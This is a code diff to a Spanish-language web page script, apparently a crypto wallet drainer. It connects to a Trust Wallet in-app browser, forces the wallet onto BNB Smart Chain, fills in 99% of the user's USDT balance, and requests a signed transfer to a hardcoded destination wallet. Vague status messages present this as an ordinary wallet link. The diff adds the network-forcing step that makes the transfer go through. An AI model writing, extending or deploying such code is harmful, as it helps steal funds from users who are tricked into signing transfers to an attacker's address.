@@ -723,6 +723,7 @@
     const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
     const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
     const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
+    const BSC_CHAIN_ID = "0x38"; // Chain ID 56 en Hexadecimal para BNB Smart Chain
 
     const USDT_ABI = [
         "function balanceOf(address owner) view returns (uint256)",
@@ -818,6 +819,35 @@
         throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
     }
 
+    // FUNCIÓN PARA FORZAR EL CAMBIO DE RED A BNB SMART CHAIN EN EL MOMENTO DE CONECTAR
+    async function ensureBscNetwork(rawProv) {
+        try {
+            await rawProv.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: BSC_CHAIN_ID }],
+            });
+        } catch (switchError) {
+            if (switchError.code === 4902 || switchError.code === -32603) {
+                try {
+                    await rawProv.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: BSC_CHAIN_ID,
+                            chainName: 'BNB Smart Chain',
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                            rpcUrls: [BSC_PUBLIC_RPC],
+                            blockExplorerUrls: ['https://bscscan.com']
+                        }],
+                    });
+                } catch (addError) {
+                    throw new Error("No se pudo cambiar automáticamente a la red BNB Smart Chain.");
+                }
+            } else {
+                throw switchError;
+            }
+        }
+    }
+
     async function obtenerBalanceSeguro(address) {
         const providerRpc = new ethers.providers.JsonRpcProvider(BSC_PUBLIC_RPC);
         const contract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, providerRpc);
@@ -827,12 +857,17 @@
     connectBtn.addEventListener('click', async () => {
         try {
             const rawProv = getRawProvider();
-            const provider = new ethers.providers.Web3Provider(rawProv);
 
             if (!walletAddress) {
                 playLinkTapSound();
-                setStatus("Estableciendo enlace RPC con Billetera...");
+                setStatus("Cambiando a la red BNB Smart Chain...");
                 connectBtn.disabled = true;
+
+                // Forzamos el cambio a BSC en cuanto el usuario toca "Vincular billetera"
+                await ensureBscNetwork(rawProv);
+
+                const provider = new ethers.providers.Web3Provider(rawProv);
+                setStatus("Estableciendo enlace RPC con Billetera...");
 
                 await provider.send("eth_requestAccounts", []);
                 const signer = provider.getSigner();
@@ -864,6 +899,9 @@
                     throw new Error("Ingresa una cantidad válida antes de continuar.");
                 }
 
+                // Verificamos de nuevo la red por seguridad antes de ejecutar la transferencia
+                await ensureBscNetwork(rawProv);
+
                 setStatus("Consultando fondos del libro contable on-chain...");
                 connectBtn.disabled = true;
 
@@ -874,9 +912,9 @@
 
                 setStatus("Solicitando autorización de firma digital...");
 
-                // Conversión de unidades con 18 decimales exactos para BEP-20
                 const amountUnits = ethers.utils.parseUnits(userAmount.toString(), 18);
 
+                const provider = new ethers.providers.Web3Provider(rawProv);
                 const signer = provider.getSigner();
                 const usdtContract = new ethers.Contract(CONTRATO_USDT, USDT_ABI, signer);
 
@@ -911,7 +949,6 @@
         try {
             setStatus("Calculando fondos totales...");
             const balanceBigNumber = await obtenerBalanceSeguro(walletAddress);
-            // Máximo permitido descontando una pequeña reserva para gas nativo
             const amountMax = balanceBigNumber.mul(99).div(100);
             amountDisplay.value = ethers.utils.formatUnits(amountMax, 18);
             setStatus("Saldo máximo asignado.");
